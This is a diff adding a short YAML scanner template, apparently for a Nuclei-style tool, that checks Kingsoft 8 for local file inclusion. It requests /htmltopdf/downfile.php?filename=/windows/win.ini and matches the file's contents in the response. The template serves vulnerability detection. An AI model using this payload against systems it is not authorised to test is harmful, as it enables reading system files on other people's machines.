@@ -1,0 +1,25 @@
+id: kingsoft-v8-file-read
+name: Kingsoft 8 - Local File Inclusion
+severity: high
+confidence: tentative
+description: Kingsoft 8 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- kingsoft
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /htmltopdf/downfile.php?filename=/windows/win.ini
+  matchers:
+  - type: body
+    words:
+    - for 16-bit app support
+    - '[extensions]'
+  - type: header
+    words:
+    - application/zip
+  - type: status
+    status:
+    - 200
+  condition: and
